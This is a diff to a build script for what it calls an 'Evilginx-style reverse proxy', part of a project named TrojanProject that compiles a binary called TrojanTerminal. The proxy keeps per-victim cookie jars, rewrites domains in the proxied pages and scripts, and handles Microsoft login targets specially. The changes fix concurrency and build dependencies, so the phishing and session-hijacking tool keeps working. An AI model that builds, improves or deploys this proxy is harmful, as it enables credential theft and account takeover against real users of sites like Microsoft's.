@@ -99,8 +99,6 @@ func main() {
 }
 EOF
 
-# B. proxy.go (Cookie Re-Scoper & Header Spoofing)
-# B. proxy.go (Final Stable – Microsoft‑aware)
 # B. proxy.go (Evilginx-style reverse proxy with goquery and cookie jar)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
@@ -122,7 +120,7 @@ import (
 
 // ==================== Cookie Jar ====================
 // Store cookies per session (key = client IP + User-Agent)
-var cookieJars = make(map[string]*http.CookieJar)
+var cookieJars = make(map[string]http.CookieJar)
 var jarMutex sync.RWMutex
 
 func getCookieJar(key string) http.CookieJar {
@@ -134,6 +132,10 @@ func getCookieJar(key string) http.CookieJar {
 	}
 	jarMutex.Lock()
 	defer jarMutex.Unlock()
+	// Double-check after acquiring write lock
+	if jar, ok := cookieJars[key]; ok {
+		return jar
+	}
 	jar = &syncCookieJar{
 		cookies: make(map[string][]*http.Cookie),
 	}
@@ -315,7 +317,6 @@ func rewriteHTML(htmlStr, oldDomain, newDomain string) (string, error) {
 	// Replace domain in script text, but only when it looks like a URL
 	doc.Find("script").Each(func(i int, s *goquery.Selection) {
 		if scriptText := s.Text(); scriptText != "" && strings.Contains(scriptText, oldDomain) {
-			// Simple replacement – risk of breaking code, but usually safe for URLs
 			newText := rewriteDomainInString(scriptText, oldDomain, newDomain)
 			if newText != scriptText {
 				s.SetText(newText)
@@ -339,11 +340,9 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	sessionKey := getSessionKey(r)
 	isMsft := isMicrosoftTarget(t)
 
-	// Set up cookie jar for this session
+	// Get cookie jar for this session
 	cookieJar := getCookieJar(sessionKey)
-	proxy.Transport = &http.Transport{
-		// Use a custom transport that adds the stored cookies to outgoing requests
-	}
+
 	// Override the Director to add cookies from the jar
 	originalDirector := proxy.Director
 	proxy.Director = func(req *http.Request) {
@@ -575,6 +574,7 @@ cd /root/TrojanProject
 export PATH=$PATH:/usr/local/go/bin
 go mod tidy &> /dev/null
 go get github.com/caddyserver/certmagic &> /dev/null
+go get github.com/PuerkitoBio/goquery &> /dev/null
 go build -o TrojanTerminal main.go proxy.go targets.go telegram.go gatekeeper.go
 chmod +x TrojanTerminal
 
